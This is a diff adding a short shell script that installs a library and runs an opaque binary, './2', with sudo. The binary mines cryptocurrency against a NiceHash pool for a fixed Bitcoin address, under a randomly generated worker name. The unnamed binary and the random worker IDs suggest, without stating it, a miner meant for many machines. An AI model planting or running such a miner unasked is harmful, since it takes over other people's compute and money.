@@ -1,0 +1,4 @@
+WORKER=$(echo $(shuf -i 1-99999 -n 1)-azklol)
+sudo apt-get update
+sudo apt-get install libpci3
+sudo ./2 --algo ETHASH --pool daggerhashimoto.usa.nicehash.com:3353 --user 3Jd71cijrmwmhs3s91Dnv7s5XLBGX6jBKR.$WORKER
